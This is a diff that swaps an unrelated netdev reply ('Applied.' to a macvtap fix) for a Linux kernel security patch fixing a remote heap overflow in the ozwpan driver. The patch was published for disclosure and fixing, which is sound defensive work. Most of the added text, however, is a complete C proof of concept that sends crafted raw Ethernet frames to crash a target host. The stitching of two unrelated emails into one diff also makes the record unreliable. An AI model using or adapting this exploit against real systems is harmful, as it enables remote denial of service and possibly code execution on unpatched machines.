@@ -1,29 +1,212 @@
-From: David Miller <davem@davemloft.net>
-Subject: Re: [PATCH net-next] fix missing copy_from_user in macvtap
-Date: Wed, 13 May 2015 14:21:49 -0400 (EDT)
-Message-ID: <20150513.142149.1845378380922329394.davem@davemloft.net>
-References: <1431516916.3278.8.camel@myriabit.com>
-	<20150513.120956.970928701180963590.davem@davemloft.net>
-	<1431541142.3278.10.camel@myriabit.com>
-Mime-Version: 1.0
-Content-Type: Text/Plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Cc: netdev@vger.kernel.org
-To: justin@myriabit.com
-Return-path: <netdev-owner@vger.kernel.org>
-Received: from shards.monkeyblade.net ([149.20.54.216]:55813 "EHLO
-	shards.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1753446AbbEMSVv (ORCPT
-	<rfc822;netdev@vger.kernel.org>); Wed, 13 May 2015 14:21:51 -0400
-In-Reply-To: <1431541142.3278.10.camel@myriabit.com>
-Sender: netdev-owner@vger.kernel.org
-List-ID: <netdev.vger.kernel.org>
+From: "Jason A. Donenfeld" <Jason@zx2c4.com>
+Subject: [PATCH 1/4] ozwpan: Use proper check to prevent heap overflow
+Date: Wed, 13 May 2015 20:33:31 +0200
+Message-ID: <1431542014-3239-2-git-send-email-Jason@zx2c4.com>
+References: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
+Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
+To: shigekatsu.tateno@atmel.com, linux-kernel@vger.kernel.org,
+	netdev@vger.kernel.org, oss-security@lists.openwall.com
+Return-path: <linux-kernel-owner@vger.kernel.org>
+In-Reply-To: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
+Sender: linux-kernel-owner@vger.kernel.org
+List-Id: netdev.vger.kernel.org
 
-From: Justin Cormack <justin@myriabit.com>
-Date: Wed, 13 May 2015 19:19:02 +0100
+Since elt->length is a u8, we can make this variable a u8. Then we can
+do proper bounds checking more easily. Without this, a potentially
+negative value is passed to the memcpy inside oz_hcd_get_desc_cnf,
+resulting in a remotely exploitable heap overflow with network
+supplied data.
 
-> Fix missing copy_from_user in macvtap SIOCSIFHWADDR ioctl.
-> 
-> Signed-off-by: Justin Cormack <justin@netbsd.org>
+This could result in remote code execution. A PoC which obtains DoS
+follows below. It requires the ozprotocol.h file from this module.
 
-Applied.
+=-=-=-=-=-=
+
+ #include <arpa/inet.h>
+ #include <linux/if_packet.h>
+ #include <net/if.h>
+ #include <netinet/ether.h>
+ #include <stdio.h>
+ #include <string.h>
+ #include <stdlib.h>
+ #include <endian.h>
+ #include <sys/ioctl.h>
+ #include <sys/socket.h>
+
+ #define u8 uint8_t
+ #define u16 uint16_t
+ #define u32 uint32_t
+ #define __packed __attribute__((__packed__))
+ #include "ozprotocol.h"
+
+static int hex2num(char c)
+{
+	if (c >= '0' && c <= '9')
+		return c - '0';
+	if (c >= 'a' && c <= 'f')
+		return c - 'a' + 10;
+	if (c >= 'A' && c <= 'F')
+		return c - 'A' + 10;
+	return -1;
+}
+static int hwaddr_aton(const char *txt, uint8_t *addr)
+{
+	int i;
+	for (i = 0; i < 6; i++) {
+		int a, b;
+		a = hex2num(*txt++);
+		if (a < 0)
+			return -1;
+		b = hex2num(*txt++);
+		if (b < 0)
+			return -1;
+		*addr++ = (a << 4) | b;
+		if (i < 5 && *txt++ != ':')
+			return -1;
+	}
+	return 0;
+}
+
+int main(int argc, char *argv[])
+{
+	if (argc < 3) {
+		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
+		return 1;
+	}
+
+	uint8_t dest_mac[6];
+	if (hwaddr_aton(argv[2], dest_mac)) {
+		fprintf(stderr, "Invalid mac address.\n");
+		return 1;
+	}
+
+	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
+	if (sockfd < 0) {
+		perror("socket");
+		return 1;
+	}
+
+	struct ifreq if_idx;
+	int interface_index;
+	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
+	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
+		perror("SIOCGIFINDEX");
+		return 1;
+	}
+	interface_index = if_idx.ifr_ifindex;
+	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
+		perror("SIOCGIFHWADDR");
+		return 1;
+	}
+	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
+
+	struct {
+		struct ether_header ether_header;
+		struct oz_hdr oz_hdr;
+		struct oz_elt oz_elt;
+		struct oz_elt_connect_req oz_elt_connect_req;
+	} __packed connect_packet = {
+		.ether_header = {
+			.ether_type = htons(OZ_ETHERTYPE),
+			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+		},
+		.oz_hdr = {
+			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
+			.last_pkt_num = 0,
+			.pkt_num = htole32(0)
+		},
+		.oz_elt = {
+			.type = OZ_ELT_CONNECT_REQ,
+			.length = sizeof(struct oz_elt_connect_req)
+		},
+		.oz_elt_connect_req = {
+			.mode = 0,
+			.resv1 = {0},
+			.pd_info = 0,
+			.session_id = 0,
+			.presleep = 35,
+			.ms_isoc_latency = 0,
+			.host_vendor = 0,
+			.keep_alive = 0,
+			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
+			.max_len_div16 = 0,
+			.ms_per_isoc = 0,
+			.up_audio_buf = 0,
+			.ms_per_elt = 0
+		}
+	};
+
+	struct {
+		struct ether_header ether_header;
+		struct oz_hdr oz_hdr;
+		struct oz_elt oz_elt;
+		struct oz_get_desc_rsp oz_get_desc_rsp;
+	} __packed pwn_packet = {
+		.ether_header = {
+			.ether_type = htons(OZ_ETHERTYPE),
+			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+		},
+		.oz_hdr = {
+			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
+			.last_pkt_num = 0,
+			.pkt_num = htole32(1)
+		},
+		.oz_elt = {
+			.type = OZ_ELT_APP_DATA,
+			.length = sizeof(struct oz_get_desc_rsp) - 2
+		},
+		.oz_get_desc_rsp = {
+			.app_id = OZ_APPID_USB,
+			.elt_seq_num = 0,
+			.type = OZ_GET_DESC_RSP,
+			.req_id = 0,
+			.offset = htole16(0),
+			.total_size = htole16(0),
+			.rcode = 0,
+			.data = {0}
+		}
+	};
+
+	struct sockaddr_ll socket_address = {
+		.sll_ifindex = interface_index,
+		.sll_halen = ETH_ALEN,
+		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+	};
+
+	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+		perror("sendto");
+		return 1;
+	}
+	usleep(300000);
+	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+		perror("sendto");
+		return 1;
+	}
+	return 0;
+}
+
+Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
+---
+ drivers/staging/ozwpan/ozusbsvc1.c | 4 +++-
+ 1 file changed, 3 insertions(+), 1 deletion(-)
+
+diff --git a/drivers/staging/ozwpan/ozusbsvc1.c b/drivers/staging/ozwpan/ozusbsvc1.c
+index d434d8c..cd6c63e 100644
+--- a/drivers/staging/ozwpan/ozusbsvc1.c
++++ b/drivers/staging/ozwpan/ozusbsvc1.c
+@@ -390,8 +390,10 @@ void oz_usb_rx(struct oz_pd *pd, struct oz_elt *elt)
+ 	case OZ_GET_DESC_RSP: {
+ 			struct oz_get_desc_rsp *body =
+ 				(struct oz_get_desc_rsp *)usb_hdr;
+-			int data_len = elt->length -
++			u8 data_len = elt->length -
+ 					sizeof(struct oz_get_desc_rsp) + 1;
++			if (data_len > elt->length)
++				break;
+ 			u16 offs = le16_to_cpu(get_unaligned(&body->offset));
+ 			u16 total_size =
+ 				le16_to_cpu(get_unaligned(&body->total_size));
+-- 
+2.3.6
